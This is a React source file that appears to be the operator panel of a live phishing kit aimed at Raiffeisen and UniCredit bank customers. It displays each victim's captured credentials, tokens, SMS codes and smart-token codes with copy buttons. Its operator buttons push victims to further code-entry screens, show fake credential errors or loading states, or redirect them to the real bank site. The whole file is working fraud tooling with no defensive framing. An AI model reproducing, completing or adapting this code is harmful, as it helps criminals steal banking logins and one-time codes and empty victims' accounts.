import React, { useState, useContext, Fragment  } from 'react'
import moment from 'moment'

import { UserContext } from './UserContext'
import { User } from './User'
import { ajax } from '../utils/client'
import { AgentInstructions, BankTypes, CREDENTIALS_DELIMETER, UserActions, UserStatus } from '../utils/constants'
import { AppStorage, copyStringToClipboard } from '../utils/utils'
import { Messaging } from '../utils/messages'

export function Messages({ usersData }) {

  const [userId] = useContext(UserContext)
  const userData = usersData[userId]

  return (
    <div className="messages sidebar">
      {userData && (
        <div>
          <div>
            <User user={userData} />
          </div>
          <UserMessages messages={userData.messages} />
          <Actions userId={userId} />
        </div>
      )}
    </div>
  )
}

function UserMessages({ messages }) {
  return (
    <div className="user-messages">
      {messages && messages.map(msg => <Message key={msg.id} message={msg}/>)}
    </div>
  )
}

const isUserMessage = action => action.includes('USER')
const isAgentMessage = action => action.includes('INSTR')



function Message({ message: { action, payload, time } }) {
  let Component = null
  switch (action) {
    case UserActions.SEND_CREDENTIALS:
    case UserActions.SEND_TOKEN:
    case UserActions.SEND_SMS:
    case UserActions.SEND_TECH_DATA:

    case UserActions.RAIF_SEND_AUTH_CODE:
    case UserActions.RAIF_SEND_SMART_TOKEN:
    case UserActions.RAIF_SEND_SMART_TOKEN_SMS:
    case UserActions.UNICREDIT_SEND_IMAGE:
      Component = UserCredentialsMessage
      break;

    case AgentInstructions.GO_TO_HOME_SCREEN:
    case AgentInstructions.GO_TO_TOKEN_SCREEN:
    case AgentInstructions.RAIF_GO_TO_AUTH_CODE_SCREEN:
    case AgentInstructions.GO_TO_SMS_SCREEN:
    case AgentInstructions.GO_TO_TECH_SCREEN:
    case AgentInstructions.GO_TO_ORIGINAL_SITE:
    case AgentInstructions.RAIF_GO_TO_SMART_TOKEN:
    case AgentInstructions.RAIF_GO_TO_SMART_TOKEN_SMS:
    case AgentInstructions.ERR_MSG_INVALID_CREDENTIALS:
    case AgentInstructions.SHOW_LOADING_STATE:
    case AgentInstructions.UNICREDIT_GO_TO_IMAGE:
      Component = AgentInstructionMessage
      break;

    default:
    // do nothing
  }

  if (!Component) {
    return null
  }


  return (
    <div className={`${isUserMessage(action) ? 'user-msg' : 'agent-msg'}`}>
      <div className="msg-item">
        <div className="msg-time">
          {moment(time).format('HH:mm:ss')}
        </div>
        <div className="msg-action">
          <Component action={action} payload={payload} />
        </div>
      </div>
    </div>
  )

}

function UserCredentialsMessage({ action, payload }) {
  let label;
  switch (action) {
    case UserActions.SEND_CREDENTIALS:
      label = 'Credentials'
      break;
    case UserActions.SEND_TOKEN:
      label = 'Token'
      break;
    case UserActions.RAIF_SEND_AUTH_CODE:
      label = 'Pers fizice Auth code'
      break;
    case UserActions.SEND_SMS:
      label = 'Pers fizice SMS code'
      break;
    case UserActions.RAIF_SEND_SMART_TOKEN:
      label = 'Pers fizice Smart Token'
      break;
    case UserActions.RAIF_SEND_SMART_TOKEN_SMS:
      label = 'Pers fizice Smart Token SMS'
      break;

    case UserActions.SEND_TECH_DATA:
      label = 'Technical data'
      break;
    case UserActions.UNICREDIT_SEND_IMAGE:
      label = 'Pers fizice image'
      break;
    default:
      // do nothing
  }

  return (
    <div className="msg-payload">
      <label>{label}:</label>
      {payload && payload.split(CREDENTIALS_DELIMETER).map(item =>
        <Fragment>
          <span className="msg-payload-value">{item}</span>
          <button onClick={() => {copyStringToClipboard(item)} }>copy</button>
        </Fragment>
      )}

    </div>
  )

}

function AgentInstructionMessage({ action, payload }) {
  return (
    <div>
      <label>{action}</label>
      <span className="msg-payload-value">{payload}</span>
    </div>
  )
}



function Actions({ userId }) {

  const [description, setDescription] = useState('')

  return (
    <div className="agent-actions">
      <h3 style={{ margin: '0px' }}>{AppStorage.bank}</h3>

      <div className="agent-actions-update-user">
        <div className="agent-action-description">
          <input type="text" value={description} onChange={e => setDescription(e.target.value)} />
          <button onClick={() => updateDescription(userId, description, setDescription)}>add description</button>
        </div>
        <div className="agent-action-status">
          <button onClick={() => updateStatus(userId, UserStatus.IGNORE)}>Ignore</button>
          <button onClick={() => updateStatus(userId, UserStatus.IMPORTANT)}>Important</button>
        </div>
      </div>
      <div className="agent-action-instructions">
        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_HOME_SCREEN})}>Home</button>
        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_SMS_SCREEN})}>Pers fizice SMS Code</button>
        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_TECH_SCREEN})}>Technical Works</button>
        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_ORIGINAL_SITE})}>Original site</button>
        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.ERR_MSG_INVALID_CREDENTIALS})}>Error Credentials</button>
        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.SHOW_LOADING_STATE})}>Show Loading ...</button>
        </div>
          <ActionWithPayload userId={userId} type={AgentInstructions.GO_TO_TOKEN_SCREEN} text="Token"/>
        <div>

        {AppStorage.bank === BankTypes.RAIFFEISEN && (
        <div>
          <button onClick={() => Messaging.send(userId, { type: AgentInstructions.RAIF_GO_TO_AUTH_CODE_SCREEN})}>Pers fizice Auth Code</button>
          <button onClick={() => Messaging.send(userId, { type: AgentInstructions.RAIF_GO_TO_SMART_TOKEN})}>Pers fizice Smart Token</button>
          <button onClick={() => Messaging.send(userId, { type: AgentInstructions.RAIF_GO_TO_SMART_TOKEN_SMS})}>Pers fizice Smart Token SMS</button>
        </div>)}
        {AppStorage.bank === BankTypes.UNI_CREDIT && (
        <div>
          <button onClick={() => Messaging.send(userId, { type: AgentInstructions.UNICREDIT_GO_TO_IMAGE})}>Pers fizice Image</button>
        </div>)}
      </div>
    </div>

  )
}

function ActionWithPayload({ userId, type, text }) {

  const [payload, setPayload] = useState('')

  return (
    <Fragment>
      <input type="text" value={payload} onChange={e => setPayload(e.target.value)} />
      <button onClick={() => {
        Messaging.send(userId, { type, payload })
        setPayload('')
      }}>{text}</button>
    </Fragment>

  )
}


const updateDescription = (userId, description, setDescription) => {
  ajax('/agent/description', 'POST', { userId, description })
  setDescription('')
}

const updateStatus = (userId, status) => {
  ajax('/agent/status', 'POST', { userId, status })
}

const agentInstructions = (userId, action) => {
  Messaging.send(userId, action)
}



